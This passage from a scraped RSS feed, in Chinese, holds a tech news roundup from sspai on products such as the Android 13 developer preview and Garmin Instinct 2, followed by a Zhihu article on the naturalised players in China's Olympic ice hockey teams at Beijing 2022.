href=\"http://www.zhihu.com/question/312144630?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">宝马3系2019款和奔驰c哪个好？</a><br>\n","link":"http://www.zhihu.com/question/515544187/answer/2342630541?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"派早报：CalDigit 推出 TS 4 扩展坞、Google 发布首个 Android 13 开发者测试版","date":"2022-02-11 01:02:23","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>CalDigit 推出 TS 4 扩展坞</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c82r85lb34ta9bscqif0.jpeg\"></figure><p>CalDigit 于 2 月 10 日推出 Thunderbolt Station 4 扩展坞，该扩展坞基于最新的 Thunderbolt 4 协议，并配备了包括了 3 个 Thunderbolt 4 接口、3 个仅数据传输的 USB-C 10Gb/s 接口、5 个 USB-A 接口、 2.5GbE 以太网端口在内的总计 18 个端口。该拓展坞支持高达 98W 直通供电，并兼容 iPad Pro，目前已经正式发售，售价为 360 美元。<a href=\"https://9to5mac.com/2022/02/08/caldigit-launches-ts4-thunderbolt-dock-18-ports/\" target=\"_blank\">来源</a></p>\n<h3>Google 发布首个 Android 13 开发者测试版</h3>\n<p>Google 于 2 月 11 日发布了 Android 13 首个开发者 beta 版本，Android 13 再次将隐私和安全作为系统开发的重点，包括了：通过系统范围内的照片和视频选择器允许你更安全的和第三方应用共享照片；NEARBY_WIFI_DEVICES 允许让应用无需请求定位权限的情况下发现附近的网络。此外，Android 13 还还包括了允许第三方应用创建此前专属于 Pixel Launcher 主题图标在内的一系列改进。目前 Android 13 DP1 仅支持 Pixel 4 至 Pixel 6 的 Pixel 系列机型刷机体验，面向公众的 Android Beta 版本则会在今年晚些时候推出。我们也将在晚些时候发布 Android 13 首个 beta 具透文章。<a href=\"https://9to5google.com/2022/02/10/android-13-developer-preview/\" target=\"_blank\">来源</a></p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c82r865b34taavnbbje0.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c82r86db34taavnbbjeg.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c82r86tb34ta9bscqifg.jpeg\" alt=\"\"></figure><h3>佳明正式发布 Instinct 系列智能手表</h3>\n<p>2 月 9 日，佳明（GARMIN）正式发布 Instinct 2 系列智能户外运动手表，该手表配备了全天候健康数据，包括了睡眠、血氧脉搏、压力在内的多项指标监测，并支持健身建议、健康快报等功能。续航方面，根据官方信息显示，该系列手表在不间断使用下手表的续航约为 4 周。外观方面， Instinct 2 将提供 45mm 以及 40mm 两种尺寸，以及极光绿、烈焰红和湖水绿三种配色。此外，Instinct 2 还针对不同的人群提供了包括浪潮版、战术版、太阳能版、非太阳能版在内的不同版本，预计售价为 2880 元。<a href=\"https://www.garmin.com.cn/products/sports-recreation/instinct-2-solar-blue/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c82r87db34ta98875jqg.jpeg\"></figure><h3>LumaFusion 将推出 Android 版本</h3>\n<p>2 月 10 日，LumaFusion 在官网更新开发信息，宣布将在未来推出 LumaFusion 的 Android 版本和 Chrome OS 版本。其中 Android 版本将于 2022 年上半年正式发布，该软件最低需要 Android 11 以及以上的操作系统，此外该软件还将支持简体中文、荷兰语、法语、德语、意大利语、日语、韩语、俄语、西班牙语、土耳其语和美国英语在内的多种语言。<a href=\"https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwiPksT6sfb1AhUQT2wGHaFcCggQFnoECAMQAQ&amp;url=https%3A%2F%2Fluma-touch.com%2Flumafusion-for-ios-2%2F&amp;usg=AOvVaw0VcJJRdoX7aIqbtBAKY37F\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c82r87lb34taatkrlh40.jpeg\"></figure><h3>腾讯 QQ 正式推出超级 QQ 秀</h3>\n<p>2 月 10 日，腾讯 QQ 正式向所有用户推出超级 QQ 秀，该产品从原有的 2D 静态设计升级为 3D 动态效果。用户可以根据自己的喜好，通过「捏脸」和「换装」的方式创造属于自己的超级 QQ 秀。此外，超级 QQ 秀还集成了「小窝」系统，让用户与虚拟小人实现进一步的交互。<a href=\"https://www.ithome.com/0/602/429.htm\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c82r87tb34taatkrlh4g.jpeg\"></figure><h2>看看就行的小道消息</h2>\n<ul>\n<li>Apple 近日发布了 Apple Music Android Beta 版本，在本次测试版本的代码中显示，Apple 或将推出一项名为 Apple Classical 的服务。<a href=\"http://-%20https//9to5google.com/2022/02/09/apple-music-widgets-classical/\" target=\"_blank\">来源</a>\n</li>\n<li>据外媒报道，Samsung S22 的发布会上出现了 Windows 11 还未上线的新功能，用户可以通过 Your Phone 程序快速在任务栏打开最近使用的三个 Android App。<a href=\"http://-%20https//www.xda-developers.com/samsung-recent-apps-your-phone-windows-pc/\" target=\"_blank\">来源</a>\n</li>\n<li>据 macrumors 报道称，在近期 App Store 上传日志以及 Apple 开源代码上发现了对 realityOS 这个新系统的引用，据悉该系统将作为 Apple 的 AR/VR 设备的系统，此前该系统被称作是 rOS。此前有消息称 Apple 已经将其 VR/AR 设备的发布时间从 2022 年延至 2023 年，原因是 Apple 还需要解决装置过热等硬件技术问题。<a href=\"https://www.theverge.com/22925038/apple-realityos-augmented-reality-headset-operating-system-rumors?scrolla=5eb6d68b7fedc32c19ef33b4\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2>少数派的近期动态</h2>\n<ul>\n<li>📕 <a href=\"https://sspai.com/prime/precog/techod-0x08\" target=\"_blank\">科技漫游第 0x08 期</a> 更新完毕，详解 <a href=\"https://sspai.com/prime/story/hyper-v-tutorial\" target=\"_blank\">Hyper-V 虚拟机使用</a>、介绍「派早报」栏目<a href=\"https://sspai.com/prime/story/whitelisted-news-custom-search\" target=\"_blank\">幕后技巧</a>、更新 PowerPoint 实用教程<a href=\"https://sspai.com/prime/story/learning-ppt-ch-9\" target=\"_blank\">完结篇</a>。</li>\n<li>🎇 会员通讯 <a href=\"https://sspai.com/prime/precog/vol015-pre-moving-forward\" target=\"_blank\">第 15 期</a> 上线，带你了解 <a href=\"https://sspai.com/prime/story/vol015-talk-about-background-check\" target=\"_blank\">工作背景调查</a>、建立 <a href=\"https://sspai.com/prime/story/vol015-how-to-take-smart-notes\" target=\"_blank\">写作工作流</a>、线下 <a href=\"https://sspai.com/prime/story/vol015-ebook-or-physical-book\" target=\"_blank\">读书找书</a> 等。</li>\n<li>☕ 少数派报告《<a href=\"https://sspai.com/prime/precog/specialty-coffee-report\" target=\"_blank\">精品咖啡入门指南</a>》已上线，从相对硬核的咖啡豆种、处理法、烘焙法到大家关心的器材和冲煮攻略，都在这里啦！</li>\n</ul>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li><a href=\"https://sspai.com/post/71348\" target=\"_blank\">📦 四边等宽的 Galaxy、披着 S 之名的 Note：三星 Galaxy Unpacked 看点汇总</a></li>\n<li><a href=\"https://sspai.com/post/71352\" target=\"_blank\">🎮 《异度神剑 3》正式公布！任天堂直面会消息汇总</a></li>\n<li><a href=\"https://sspai.com/post/71210\" target=\"_blank\">👶 年度征文 | 对生孩子这件事情的思考</a></li>\n<li>🌟<a href=\"https://sspai.com/post/71361\" target=\"_blank\">新玩意 093｜少数派的编辑们最近买了啥？ - 少数派</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71370"},{"title":"中国冰球队一堆归化球员，为什么没有像男足一样引发大量争议？","date":"2022-02-10 13:48:59","description":"\n<p data-pid=\"20VCGxEx\"><b><u><i>文：体工队特约作者姚舜</i></u></b></p>\n<p data-pid=\"SIpyN4-E\">“未来你愿意代表中国出战北京冬奥会吗？”</p>\n<p data-pid=\"1g4mUY96\">在北京昆仑鸿星冰球俱乐部成立后的第二个赛季（2017年），这是所有华裔球员在接受采访时都会被问到的问题。那个休赛期的夏天，昆仑鸿星通过运作招揽了6名华裔球员加盟——叶劲光、海云、建安、赵传礼、骆嘉、段仕能（坊间称其为“华裔六君子”），再算上建队伊始便加入俱乐部的袁俊杰和英如镝，球队里就有了8张东方面孔。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-0f407d87ba4ffc663c10031c0e3cc201_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"367\" data-watermark=\"original\" data-original-src=\"v2-0f407d87ba4ffc663c10031c0e3cc201\" data-watermark-src=\"v2-abe2c242ef80b903e7db6d12b7250be6\" data-private-watermark-src=\"v2-b7d2f93caea614fd518a79af6321f386\"></p>\n<p data-pid=\"L4fauZgG\">于是，开头的那个问题就成了理所当然的疑问，彼时距离北京冬奥会还有五年，这期间的不确定性极大，并且涉及国籍转换、民族情绪等等敏感问题。而面对媒体不厌其烦地提问，所有华裔球员的回答呈现出一种不约而同的标准化——</p>\n<p data-pid=\"w7okac6j\">“是的，如果可以，我愿意代表中国出战2022冬奥会，但时间还很长，我们看接下来会发生什么。”</p>\n<p><img src=\"https://pic4.zhimg.com/v2-21d1087faad5308057114fed8c58fde8_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"508\" data-watermark=\"original\" data-original-src=\"v2-21d1087faad5308057114fed8c58fde8\" data-watermark-src=\"v2-1fb0c8cfe781289a6eff6d8759740ae0\" data-private-watermark-src=\"v2-e6aed710b1fcfeafabf565e6438fc945\"></p>\n<p data-pid=\"M4Ak_29x\">******<br></p>\n<p data-pid=\"7qJf7Z0u\">从某种程度来说，中国冰球选择归化，是一种顺理成章的战略。</p>\n<p data-pid=\"kx4iwHjN\">由于冰球运动的特殊性，实力相差较大的两支球队比赛往往呈现出一边倒的局面，除了影响观赏性以外，高速度高强度的对抗甚至会给弱势一方的球员带来生命危险，因此，<b>世界冰球按照排名分为顶级组、甲级A组、甲级B组、乙级A组、乙级B组、丙级A组、丙级B组等。</b>除顶级组12支国家队外，其他各组均有6支球队。每年夏天各组别都要进行世锦赛，每组第一可以向上升一个档，最后一名则向下降组。</p>\n<p data-pid=\"NH2Frba8\">一般来说，奥运会冰球比赛只有顶级组的12支球队参加，而中国冰球无论男女队，距离这个水平都有很大的差距。</p>\n<p data-pid=\"ff0zBwOy\"><b>冬奥会之前，中国女冰在甲级A组</b>，世界排名第20，历史上她们曾在1998年长野冬奥会上获得第四，这也是球队的最好成绩。随后中国女冰在2002年盐湖城以及2010年温哥华冬奥会上均获第七，之后连续两届缺席，已离开冬奥舞台12年之久。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2e85c952d14e88e1209a27c9bd5249e2_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"608\" data-watermark=\"original\" data-original-src=\"v2-2e85c952d14e88e1209a27c9bd5249e2\" data-watermark-src=\"v2-9a9ba5743c6fe188ecb36e2d5ada5127\" data-private-watermark-src=\"v2-e9652257185076ba38de2add57d15df9\"></p>\n<p data-pid=\"t12qydET\"><b>而中国男冰则处在乙级A组</b>，世界排名第32位，球队此前尚未打进过冬奥会。中国男冰的高光时刻还要追溯到上世纪的80年代——1981年，中国男冰参加在北京举行的C组世锦赛，一度成功升到B组（相当于现在的甲级），并创造了世界排名最高的第15；1986年首届札幌亚冬会，中国男冰曾夺得金牌。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fdf9297efe8d7628a6a0ea5123e180e9_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"611\" data-watermark=\"original\" data-original-src=\"v2-fdf9297efe8d7628a6a0ea5123e180e9\" data-watermark-src=\"v2-e8747d192cdbc8a83af468e69876fee3\" data-private-watermark-src=\"v2-e2f30e6e58dd759d9114c8d4a9766765\"></p>\n<p data-pid=\"L0sNacJv\"><b>总的来说，中国冰球的水平与世界顶级水准之间有不止一道鸿沟。</b>2018年荷兰蒂尔堡世锦赛，全本土阵容的中国男冰最终在乙级A组位列第四。2019年塞尔维亚贝尔格莱德世锦赛，全华班的中国男冰排名第五，保组成功，依旧停留在乙级A组的位置，距离奥运水准的顶级组，中间还隔了甲级A、B组两个级别。</p>\n<p data-pid=\"FoRD8p1d\">这样的情况，对于东道主来说自然略显尴尬，于是随着2022北京冬奥会的临近，是否进行球员归化的问题也越来越多次地被提及。</p>\n<p data-pid=\"rgFj8gMy\">其实在冰球圈，归化不算什么新鲜事，对中国冰球来说，最具说服力的案例来自隔壁的韩国人。2018年平昌奥运会前，东道主韩国遭遇了和中国队类似的境遇，而他们很快依靠着6名归化球员为重新构建了国家队的核心，随后球队一步步升到了顶级组，名正言顺的进入了奥运会决赛圈。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-acf907377107a80ecec059a9f633ea9b_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"961\" data-rawheight=\"662\" data-watermark=\"original\" data-original-src=\"v2-acf907377107a80ecec059a9f633ea9b\" data-watermark-src=\"v2-de1c40fe75ab4db99d0d32c67c4bd01c\" data-private-watermark-src=\"v2-79f11bb5d47b5dafbe9a06831c2f4684\"></p>\n<p data-pid=\"2SWaOXhE\">显然，这是一个可以参照和复制的案例，而昆仑鸿星这支本来就是以备战冬奥为目标而组建的中国冰球俱乐部，此时按部就班的在大陆冰球联赛参战，同时持续扩充着自己的“华裔军团”——简国辉、王泰勒、福将、韦瑞克、刘杰、沈嘉磊等带有中国血统的球员相继来投。</p>\n<p data-pid=\"t6T53zyb\">然而人算不如天算，由于疫情原因，2020年冰球世锦赛取消，2021年世锦赛也只有顶级组举行，中国队失去了冲组的机会（当然，由于当时归化问题悬而未决，全华班本身也是以保级为第一任务）。而昆仑鸿星俱乐部也遭遇重创，疫情使得他们无法在国内进行比赛，不得不在2020/21赛季将主场从中国北京搬到了莫斯科郊外。</p>\n<p data-pid=\"kD721XiZ\">失去北京主场、淡出国内视野、割裂与本土球迷间的联系，这些无疑会对俱乐部的发展造成巨大伤害。但最迫在眉睫的是，头顶上的达摩克里斯之剑依然存在——球队中的这批华裔球员是否有机会代表中国出战北京奥运会。</p>\n<p data-pid=\"sgYo8O-Z\">这个问题如同屋子里的大象，所有人都看得到，但全部选择性地闭口不谈。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6b18f03456e40025417d97e38f2b6339_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"943\" data-rawheight=\"628\" data-watermark=\"original\" data-original-src=\"v2-6b18f03456e40025417d97e38f2b6339\" data-watermark-src=\"v2-5b60b1e618973b7ded3ad4f18ebc59e0\" data-private-watermark-src=\"v2-7ea31fe89b627148b5bbd9d1d45efa6f\"></p>\n<p data-pid=\"dPYQhtGC\">******</p>\n<p data-pid=\"uh9BS4O_\">时间来到2021年7月底，经体育总局批准，男、女子冰球国家队将以北京、深圳昆仑鸿星俱乐部的名义参加2021/22赛季KHL和WHL联赛，此时距离北京冬奥会开幕仅剩下半年时间，其意味不言自明。尽管期间有消息表示中国男冰直通奥运的资格一度受到考验，不过好在12月8日国际冰联执委会最终确认了中国男冰的参赛资格，一切尘埃落定。</p>\n<p data-pid=\"O5pzUP8o\">终于，冰球归化大势已定，在短暂的时间内，一台庞大的机器正开足马力运转起来——或者说，过去几年里一切都已准备就绪，只为等待这一声哨响。</p>\n<p data-pid=\"XGAeWKDN\">2021/22赛季，昆仑鸿星俱乐部名单终于达到了“理想模式”。前五个赛季，它更多是以一家职业冰球俱乐部的形象出现，除了一些华裔球员外，其他球员多是来自北美和欧洲的雇佣兵，几乎没有中国本土球员出现。</p>\n<p data-pid=\"h350tBwn\">而2021/22赛季，36岁的华裔队长叶劲光重回球队，英如镝、鄢睿男、闫俊丞、张泽森、钟暐、国家宁、项旭东、张鹏飞、陈梓蒙、韩鹏飞等出色本土球员也进入昆仑鸿星球队大名单。本次冬奥会中国男冰的阵容也全部来源于此。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-da29e7f685a6f7b7af112844f58707d0_720w.webp?rss\" data-caption=\"叶劲光，曾在NHL打过4个完整赛季，母亲是华人，父亲是华人与爱尔兰混血\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-da29e7f685a6f7b7af112844f58707d0\" data-watermark-src=\"v2-f78e757aee1374048488a440d706c53d\" data-private-watermark-src=\"v2-25d7bcd7544c1e3f0af8971282eccbb1\"></p>\n<p data-pid=\"bN_iQ5je\">值得注意的是，除了华裔和本土球员外，本次代表中国男冰出战的还有像凯利奥斯（后卫）、斯普劳尔（后卫）、奥西波夫（后卫）、杰里米-史密斯（门将）等纯外籍归化球员。这些球员均在昆仑鸿星效力过三个赛季左右，非常熟悉和适应队友习惯以及球队打法，他们也将为中国男冰在冬奥会上筑起后防线上的归化长城。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4da80c03d4e6e08fd29821ae826e1737_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"original\" data-original-src=\"v2-4da80c03d4e6e08fd29821ae826e1737\" data-watermark-src=\"v2-2de91ca1a59ce4d77b38ac9b40608881\" data-private-watermark-src=\"v2-877608f199881716738f47f6c9b1c8cb\"></p>\n<p data-pid=\"GozTO_gJ\">在中国体育项目里，归化似乎是属于没有办法的办法。作为使用归化球员的先行者，中国男足的处境十分尴尬。正月初一，中国男足在越南河内刚刚经历了一次惨痛的失利。下半场开始前，主教练李霄鹏用张玉宁和韦世豪两名本土前锋，换下了归化球员阿兰和洛国富。场地边李霄鹏的脸隐藏在口罩之下，看不到一丝情感波动；被换下场的两名球员也没有过多的情绪表达，但那个瞬间意味着许多。</p>\n<p data-pid=\"9_tzf7hl\">李铁、李霄鹏对于归化球员“自证”式的使用，中国男足经略卡塔尔世界杯的破产，首批归化球员虎头蛇尾的表现，让圈里圈外无数人对“归化”这个短线投入的项目充满了疑问。</p>\n<p data-pid=\"ie4k4CaU\">但对于中国冰球来说，“归化”的意义却完全不同。正月初三，时隔12年中国女子冰球队再次亮相冬奥，首战1-3不敌捷克；正月初四，中国女冰终场前一分钟内连进两球，3-1绝杀丹麦，之后又1-1平日本（随后点球大战击败对手），最后一场1-2负于瑞典，<b>而这四场比赛中，中国队所有的进球都来自于归化外援。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-06e00ccf7ca7de272795262b24f54d20_720w.webp?rss\" data-caption=\"米勒，中国女冰两个无血缘归化之一（另一个是丽贝卡），打日本进了中国队常规时间唯一一个进球\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-06e00ccf7ca7de272795262b24f54d20\" data-watermark-src=\"v2-a0073a683976afe1d1392bcb38825717\" data-private-watermark-src=\"v2-9de84e45fe16f0bfc0a41484db957a0e\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-7484a159b9a36584ab976a7eef834d9a_720w.webp?rss\" data-caption=\"林绮琪，加拿大华裔归化，中国队得分王（冰球的得分技术统计是进球+助攻）\" data-size=\"normal\" data-rawwidth=\"584\" data-rawheight=\"593\" data-watermark=\"original\" data-original-src=\"v2-7484a159b9a36584ab976a7eef834d9a\" data-watermark-src=\"v2-5a8b21c76827f13a94286128690bfbf7\" data-private-watermark-src=\"v2-7b95382a2d5c3da251f60091e4782e03\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-4998ceb15e019232b3965f8ebf682b98_720w.webp?rss\" data-caption=\"于柏巍，33岁老将，唯一小组赛有得分（一次助攻）的非归化选手\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"759\" data-watermark=\"original\" data-original-src=\"v2-4998ceb15e019232b3965f8ebf682b98\" data-watermark-src=\"v2-29d1f9466971dcab71a3c0546cebd486\" data-private-watermark-src=\"v2-db50a2bcae7e85ed26aaa51f1db29e98\"></p>\n<p data-pid=\"1GAYPj6L\">由此可见，归化是短期内提升实力和成绩的速效药。但是，这却并不意味着无往不利，彻底颠覆球队原有实力水平。尽管世界排名第20的中国女冰拥有13名归化球员，甚至能以弱胜强击败日本，但由于国际比赛经验欠缺，最终小组遗憾出局。而对于拥有15名归化球员的中国男冰，赛出风采，让更多的观众了解冰球，打开中国男冰冬奥的进球账户，才是更切合实际的目标。</p>\n<p data-pid=\"iEW7lqXz\">尽管北美职业冰球联盟NHL宣布其选手不会参加本届北京冬奥会，但中国男冰所在的A组依旧艰险，同组分别是世界第一的加拿大、世界第四的美国和世界第五的德国。根据国际冰联官网数据显示，加拿大注册冰球运动员共有60多万人，美国达到56万余人，人口8300万的德国拥有2.1万冰球运动员，<b>而中国的这项数据为13388人，如果不算最近培养的10365名青少年，成年球员的数量只有3000人左右。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-a2c43ec84224685e341701203010ca54_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"576\" data-watermark=\"original\" data-original-src=\"v2-a2c43ec84224685e341701203010ca54\" data-watermark-src=\"v2-ac3ad576976b3633388db6716ec9245b\" data-private-watermark-src=\"v2-96d969227b18598362d5a0d3a2b4f529\"></p>\n<p data-pid=\"ughBIHNX\">更直观的数据来自本赛季KHL昆仑鸿星的成绩单，作为北美之外首当其冲的职业冰球联赛，KHL为本次冬奥会其中10支国家队输送了121名球员，占到总参赛球员的40%，是贡献最多的职业冰球联盟。换言之，本届冬奥会男子冰球的竞技水准也基本会保持在中国男冰熟悉的KHL级别。</p>\n<p data-pid=\"rgbYpdyb\">本赛季，作为全国家队阵容征战KHL的昆仑鸿星，在已经结束的48场比赛中9胜39负积25分，排在联盟末尾，场均进球2.1个，丢球4.1个。华裔球员占据着球队得分榜，福将（33分）、王泰勒（28分）和叶劲光（27分）本分列前三，土球员只有英如镝和向旭东各拿到1分。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d4b86e206b220dd7b519938a70e891f5_720w.webp?rss\" data-caption=\"郑恩来，田径归化名将郑妮娜力的哥哥，他们的母亲是中国田径运动员段立曾，而他的名字“恩来”则来自于其外婆郑凤荣作为新中国田径名将被周恩来总理接见的经历\" data-size=\"normal\" data-rawwidth=\"659\" data-rawheight=\"763\" data-watermark=\"original\" data-original-src=\"v2-d4b86e206b220dd7b519938a70e891f5\" data-watermark-src=\"v2-1ce804a4ca7ad07281f5cd27f3405e6b\" data-private-watermark-src=\"v2-cb50aeac9fef5451b9237022461d63b4\"></p>\n<p data-pid=\"xowUOSdM\">“对于这群中国球员，出战北京冬奥会是他们一辈子的梦想。”中国男冰主教练伊万诺-萨内塔在接受国际冰联采访时说道，“我告诉他们，我们要努力得到整个冰球世界的尊重。不要把它当作一场表演秀，我们是来赢得尊严的。所以我们一直围绕着身体对抗和战术层面进行训练，争取做到最好。”</p>\n<p data-pid=\"XFzGt2NX\">******</p>\n<p data-pid=\"au-CKNnr\">乐观来看，中国男冰是奥运会A组最早进行备战的球队，全队经过了48场KHL联赛真刀真枪的历练磨合。锋线主力中，叶劲光、骆嘉、建安从2017年便加入球队，王泰勒、福将、韦瑞克也合作了将近3个赛季；后防线上的斯普劳尔、凯利奥斯、奥西波夫和杰里米-史密斯彼此之间也无比熟悉。至少打进冬奥首球的目标并非遥不可及。<br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-9b63924e92c5afbf7d5dc69f7fe688e7_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"871\" data-rawheight=\"468\" data-watermark=\"original\" data-original-src=\"v2-9b63924e92c5afbf7d5dc69f7fe688e7\" data-watermark-src=\"v2-a8ba8bb788d2c1df876cb2ee30777ad7\" data-private-watermark-src=\"v2-d1fbff63a23c172c7bd8c008043d5dbb\"></p>\n<p data-pid=\"UU0o4tSa\">A组的三个对手中，加拿大和美国一脉相承，同属北美流派，打法奔放，冲击力极强，在高速高压高对抗的情况下，球员往往有着杰出的个人发挥；在平昌冬奥会上一鸣惊人的德国队，虽然决赛憾负俄罗斯，但他们展示出了欧洲球队特有的团队性和纪律性，本次重回冬奥舞台，队中尽是奥运、世锦赛经验丰富的球员，将继续冲击上届未能完成的任务。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-047d1c008fb3ea4cb692c170f7d5df1f_720w.webp?rss\" data-caption=\"英如镝，袁俊杰\" data-size=\"normal\" data-rawwidth=\"815\" data-rawheight=\"555\" data-watermark=\"original\" data-original-src=\"v2-047d1c008fb3ea4cb692c170f7d5df1f\" data-watermark-src=\"v2-e41469993aeffb976a0030e1cc9b5e3a\" data-private-watermark-src=\"v2-bbf0c21df9aa4a490bcb7f8dd4235823\"></p>\n<p data-pid=\"bKq7VRl1\">与女冰赛制不同，男冰的三个小组的头名和一个最好的第二名将率先晋级八强，剩下的八支球队再进行交叉淘汰，最终产生另外四支晋级的球队。中国男冰的最好赢球机会或许在于，第二阶段遭遇顶级组中实力稍弱的拉脱维亚、丹麦，至少在主教练萨内塔看来，将会是实力相当的较量。</p>\n<p data-pid=\"oUkr8bza\"><b>相比于中国男冰的成绩，国际冰联更注重的是冰球运动能否通过本次冬奥会在中国获得长足的发展。</b>这种发展不是维持几周的“冬奥热”，而是通过系统地推广，室内室外冰场地修建，国内冰球联赛地组织，各年龄层梯队地搭建，青少年兴趣地培养，一步一步完善实现。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-bcf28b104e99ebdca87228d936a6f2df_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"586\" data-rawheight=\"441\" data-watermark=\"original\" data-original-src=\"v2-bcf28b104e99ebdca87228d936a6f2df\" data-watermark-src=\"v2-4f18336ef940c8251f7fd656230a62de\" data-private-watermark-src=\"v2-eeaf16a1ccbd38cd4d833bb326945273\"></p>\n<p data-pid=\"gPkmSHTH\">实事求是地说，这可能暂时只是一种奢望。冰球运动对场地的特殊要求，以及对参与者经济层面的投入要求，注定使它无法成为像足球、篮球这样的热门草根运动。在如今信息传播如此发达的时代，关于中国男冰参加过去两届世锦赛的相关报道也寥寥无几。</p>\n<p data-pid=\"HFmC4m8V\">但，希望总还是存在的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-316b907f6af8428fa54f9dc5de985ac2_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"891\" data-rawheight=\"942\" data-watermark=\"original\" data-original-src=\"v2-316b907f6af8428fa54f9dc5de985ac2\" data-watermark-src=\"v2-79fde4d5b9de690675d6df2737832d5d\" data-private-watermark-src=\"v2-bdf12473d9b00f9cb895c85a9e22712a\"></p>\n<p data-pid=\"P6AdH7TO\"><b>“如果有一个中国运动员，20年后站上冰球的最高舞台。人们问到他为什么练习冰球，他回答说：‘2022年，我看了中国队的比赛’，那就是我们这代人的成功。“</b>中国男冰队长的叶劲光在微博中写道。</p>\n<p data-pid=\"fe-S0bMn\">那回到开头的那个问题，“未来你愿意代表中国出战北京冬奥会吗？”</p>\n<p data-pid=\"36GHCFE2\">回答过这个问题的许多人都已不知身在何方。从2016年到2022年，无数的人员交替，世事变迁，沧海桑田。这些人有的在世界上某个小联赛中继续打拼，有的早已退役转行，有的人挣了几年快钱，有的人珍藏了这段经历，有的人还在卑微地追逐梦想。</p>\n<p data-pid=\"V2CdRS1x\">但毫无疑问，他们都是中国冰球历史进程的一部分。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ea5390d7b510cc70ce59331dbc327209_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-ea5390d7b510cc70ce59331dbc327209\" data-watermark-src=\"v2-306993db510d0bc0731adf5d182a9168\" data-private-watermark-src=\"v2-61f7fba23307e20ebf1a28069dac70a6\"></p>\n<p data-pid=\"mkRpeKWJ\">2月10日，中国男冰将首次踏上冬奥会的舞台，这支凝聚而成的队伍身后倾注了无数人的心血。它像一艘巨大无比、行驶缓慢的航船，在经历了漫长曲折的旅途后，终于按时到达港湾。</p>\n<p data-pid=\"o78HOSmX\"><b>不要看它将为我们带来什么，它的出现，本身就是一种胜利。</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wang-yi-ti-yu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">网易体育</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/514069482/answer/2342673838?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">171 个回答，查看全部。</a><br>\n                延伸阅读：<br><a 